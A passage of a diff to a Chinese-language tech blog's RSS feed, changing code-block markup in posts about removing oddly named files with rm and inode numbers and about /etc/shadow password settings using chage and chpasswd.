-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 07:08 &lt;span style="color:#98c379"&gt;&amp;#39; &amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;162&lt;/span&gt; Apr &lt;span style="color:#d19a66"&gt;16&lt;/span&gt; &lt;span style="color:#d19a66"&gt;2022&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#39;~$iscord.docx&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:03 &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:01 &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&amp;#39;Λ---ω&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:13 &lt;span style="color:#98c379"&gt;&amp;#39;␴?␴??␴??::␴?␴&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:12 ␴__␴
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:14 ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:18 &lt;span style="color:#98c379"&gt;&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:16 ␣␣␣␣␣␣␣␣
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:26 ␣ μ μ Ω Ω
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;14&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:23 &lt;span style="color:#98c379"&gt;&amp;#39;␣ μ ␴&amp;#39;$&amp;#39;\342\220\264&amp;#39;&amp;#39;Ξ&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:27
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:27
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="使用-ansi-c-quoting"&gt;使用 ANSI-C Quoting&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Using ANSI-C Quoting&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# We can also use the $ special character before enclosing the filename in single quotes&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm &lt;span style="color:#98c379"&gt;$&amp;#39;\356\200\215&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# pass an item&amp;#39;s name to rm without using the ANSI-C quoting&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm &lt;span style="color:#98c379"&gt;&amp;#39;\026\033&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm: cannot remove &lt;span style="color:#98c379"&gt;&amp;#39;\026\033&amp;#39;&lt;/span&gt;: No such file or directory
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="使用-inode-編號"&gt;使用 Inode 編號&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ls -li
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;total &lt;span style="color:#d19a66"&gt;11&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#d19a66"&gt;6517085&lt;/span&gt; -rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:18 &lt;span style="color:#98c379"&gt;&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#d19a66"&gt;7826050&lt;/span&gt; -rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;3&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;9&lt;/span&gt; 04:23 &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\356\200\215\356\200\215\356\200\215&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#d19a66"&gt;4685554&lt;/span&gt; -rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:27
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以透過 find 的 -inum 參數指定 inode 來刪除檔案。&lt;/p&gt;</description></item><item><title>/etc/shadow 與建立 yescrypt、MD5、SHA-256、SHA-512 密碼雜湊</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221114-shadow-passwords/</link><pubDate>Mon, 14 Nov 2022 12:55:39 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221114-shadow-passwords/</guid><description>&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-85bc6f182d58d90d17117328cfe44997-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total &lt;span class="m"&gt;13&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 07:08 &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;162&lt;/span&gt; Apr &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="m"&gt;2022&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;~$iscord.docx&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:03 &lt;span class="s1"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:01 &lt;span class="s1"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&amp;#39;Λ---ω&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:13 &lt;span class="s1"&gt;&amp;#39;␴?␴??␴??::␴?␴&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:12 ␴__␴
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:14 ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:18 &lt;span class="s1"&gt;&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:16 ␣␣␣␣␣␣␣␣
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:26 ␣ μ μ Ω Ω
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:23 &lt;span class="s1"&gt;&amp;#39;␣ μ ␴&amp;#39;$&amp;#39;\342\220\264&amp;#39;&amp;#39;Ξ&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:27
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:27
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"ls -l\ntotal 13\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 07:08 ' '\n-rw-r--r-- 1 ZZ 197121 162 Apr 16 2022 '~$iscord.docx'\n-rw-r--r-- 1 ZZ 197121 6 Nov 6 06:03 ''$'\\302\\226'\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:01 ''$'\\302\\226''Λ---ω'\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:13 '␴?␴??␴??::␴?␴'\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:12 ␴__␴\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:14 ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:18 '␴ω␴␴␣␦'$'\\342\\220\\264'\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:16 ␣␣␣␣␣␣␣␣\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:26 ␣ μ μ Ω Ω\n-rw-r--r-- 1 ZZ 197121 14 Nov 6 06:23 '␣ μ ␴'$'\\342\\220\\264''Ξ'\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27\n-rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="使用-ansi-c-quoting"&gt;使用 ANSI-C Quoting&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-85bc6f182d58d90d17117328cfe44997-1"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Using ANSI-C Quoting&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rm &lt;span class="s1"&gt;&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# We can also use the $ special character before enclosing the filename in single quotes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rm &lt;span class="s1"&gt;$&amp;#39;\356\200\215&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# pass an item&amp;#39;s name to rm without using the ANSI-C quoting&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rm &lt;span class="s1"&gt;&amp;#39;\026\033&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rm: cannot remove &lt;span class="s1"&gt;&amp;#39;\026\033&amp;#39;&lt;/span&gt;: No such file or directory
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"# Using ANSI-C Quoting\nrm ''$'\\302\\226'\n# We can also use the $ special character before enclosing the filename in single quotes\nrm $'\\356\\200\\215'\n\n# pass an item's name to rm without using the ANSI-C quoting\nrm '\\026\\033'\nrm: cannot remove '\\026\\033': No such file or directory\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="使用-inode-編號"&gt;使用 Inode 編號&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-85bc6f182d58d90d17117328cfe44997-2"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -li
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total &lt;span class="m"&gt;11&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;6517085&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:18 &lt;span class="s1"&gt;&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;7826050&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; Nov &lt;span class="m"&gt;9&lt;/span&gt; 04:23 &lt;span class="s1"&gt;&amp;#39;&amp;#39;$&amp;#39;\356\200\215\356\200\215\356\200\215&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;4685554&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ZZ &lt;span class="m"&gt;197121&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; Nov &lt;span class="m"&gt;6&lt;/span&gt; 06:27
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"ls -li\ntotal 11\n...\n6517085 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:18 '␴ω␴␴␣␦'$'\\342\\220\\264'\n7826050 -rw-r--r-- 1 ZZ 197121 3 Nov 9 04:23 ''$'\\356\\200\\215\\356\\200\\215\\356\\200\\215'\n4685554 -rw-r--r-- 1 ZZ 197121 4 Nov 6 06:27\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;p&gt;可以透過 find 的 -inum 參數指定 inode 來刪除檔案。&lt;/p&gt;</description></item><item><title>/etc/shadow 與建立 yescrypt、MD5、SHA-256、SHA-512 密碼雜湊</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221114-shadow-passwords/</link><pubDate>Mon, 14 Nov 2022 12:55:39 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221114-shadow-passwords/</guid><description>&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://www.baeldung.com/linux/shadow-passwords" target="_blank" rel="noopener"&gt;/etc/shadow 與建立 yescrypt、MD5、SHA-256、SHA-512 密碼雜湊&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h5 id="chage-與密碼期限"&gt;chage 與密碼期限&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;chage --list root
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Last password change : Oct 01, &lt;span style="color:#d19a66"&gt;2022&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Password expires : never
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Password inactive : never
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Account expires : never
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Minimum number of days between password change : &lt;span style="color:#d19a66"&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Maximum number of days between password change : &lt;span style="color:#d19a66"&gt;99999&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Number of days of warning before password expires : &lt;span style="color:#d19a66"&gt;7&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因此，我們可以用對應的旗標修改各欄位：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; 或 &lt;code&gt;--lastday&lt;/code&gt;：最後變更日期&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;-m&lt;/code&gt; 或 &lt;code&gt;--mindays&lt;/code&gt;：變更密碼最少間隔天數&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;-M&lt;/code&gt; 或 &lt;code&gt;--maxdays&lt;/code&gt;：密碼最大有效天數&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;-W&lt;/code&gt; 或 &lt;code&gt;--warndays&lt;/code&gt;：到期前警告天數&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;-I&lt;/code&gt; 或 &lt;code&gt;--inactive&lt;/code&gt;：密碼失效天數&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;-E&lt;/code&gt; 或 &lt;code&gt;--expiredate&lt;/code&gt;：帳號過期日期&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h5 id="chpasswd-與密碼"&gt;chpasswd 與密碼&lt;/h5&gt;
-&lt;p&gt;&lt;code&gt;echo 'user1:PASSWORD' | chpasswd --crypt-method SHA512&lt;/code&gt;&lt;/p&gt;</description></item><item><title>如何在別名指令上使用 which</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221110-which-on-an-aliased-command/</link><pubDate>Thu, 10 Nov 2022 16:24:30 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221110-which-on-an-aliased-command/</guid><description>&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-09aac70e27a421e3952fc20b4df4956e-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;chage --list root
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last password change : Oct 01, &lt;span class="m"&gt;2022&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Password expires : never
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Password inactive : never
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Account expires : never
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Minimum number of days between password change : &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Maximum number of days between password change : &lt;span class="m"&gt;99999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Number of days of warning before password expires : &lt;span class="m"&gt;7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"chage --list root\nLast password change : Oct 01, 2022\nPassword expires : never\nPassword inactive : never\nAccount expires : never\nMinimum number of days between password change : 0\nMaximum number of days between password change : 99999\nNumber of days of warning before password expires : 7\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;p&gt;因此，我們可以用對應的旗標修改各欄位：&lt;/p&gt;</description></item><item><title>如何在別名指令上使用 which</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20221110-which-on-an-aliased-command/</link><pubDate>Thu, 10 Nov 2022 16:24:30 